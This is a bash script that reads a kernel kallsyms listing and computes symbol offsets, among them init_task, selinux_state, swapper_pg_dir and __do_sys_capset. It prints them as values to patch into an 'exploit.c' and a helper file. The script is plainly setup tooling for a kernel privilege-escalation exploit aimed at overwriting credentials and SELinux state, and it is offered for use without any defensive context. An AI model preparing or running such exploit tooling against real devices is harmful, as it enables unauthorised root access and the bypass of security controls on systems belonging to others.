#!/bin/bash

if [ "$#" -ne 1 ]; then
    echo "Usage: $0 <kallsyms.txt>"
    exit 1
fi

KALLSYMS="$1"

if [ ! -f "$KALLSYMS" ]; then
    echo "Error: File $KALLSYMS not found"
    exit 1
fi

# Extract symbol addresses
idmap_pg_dir=$(grep -w "idmap_pg_dir" "$KALLSYMS" | awk '{print $1}')
swapper_pg_dir=$(grep -w "swapper_pg_dir" "$KALLSYMS" | awk '{print $1}')
init_task=$(grep -w "init_task" "$KALLSYMS" | awk '{print $1}')
selinux_state=$(grep -w "selinux_state" "$KALLSYMS" | awk '{print $1}')
do_sys_capset_start=$(grep -w "__do_sys_capset" "$KALLSYMS" | awk '{print $1}')
do_sys_capset_end=$(grep -A1 -w "__do_sys_capset" "$KALLSYMS" | tail -1 | awk '{print $1}')
text_start=$(grep -w "_text" "$KALLSYMS" | awk '{print $1}')

echo "=== Update exploit.c with these values ==="
echo ""

# Calculate offsets
if [ -n "$idmap_pg_dir" ] && [ -n "$swapper_pg_dir" ]; then
    swapper_offset=$((0x$swapper_pg_dir - 0x$idmap_pg_dir))
    printf "Line 677: swapper_pg_dir_off = idmap_pg_dir_off + 0x%x;\n" $swapper_offset
else
    echo "Warning: Could not calculate swapper_pg_dir offset"
fi

if [ -n "$idmap_pg_dir" ] && [ -n "$init_task" ]; then
    init_task_offset=$((0x$init_task - 0x$idmap_pg_dir))
    printf "Line 680: uint64_t init_task_off = idmap_pg_dir_off + 0x%x;\n" $init_task_offset
else
    echo "Warning: Could not calculate init_task offset"
fi

if [ -n "$idmap_pg_dir" ] && [ -n "$selinux_state" ]; then
    selinux_offset=$((0x$selinux_state - 0x$idmap_pg_dir))
    printf "Line 1412: uint64_t selinux_state_offset = 0x%x;\n" $selinux_offset
else
    echo "Warning: Could not calculate selinux_state offset"
fi

echo ""
echo "helpers/analyze.c:"

if [ -n "$do_sys_capset_start" ] && [ -n "$text_start" ]; then
    capset_offset=$((0x$do_sys_capset_start - 0x$text_start))
    printf "#define PHYS_ADDR 0x%x   // __do_sys_capset - _text\n" $capset_offset
else
    echo "Warning: Could not calculate __do_sys_capset offset from _text"
fi

if [ -n "$do_sys_capset_start" ] && [ -n "$do_sys_capset_end" ]; then
    capset_size=$((0x$do_sys_capset_end - 0x$do_sys_capset_start))
    printf "#define MAX_SIZE 0x%x\n" $capset_size
else
    echo "Warning: Could not calculate __do_sys_capset size"
fi
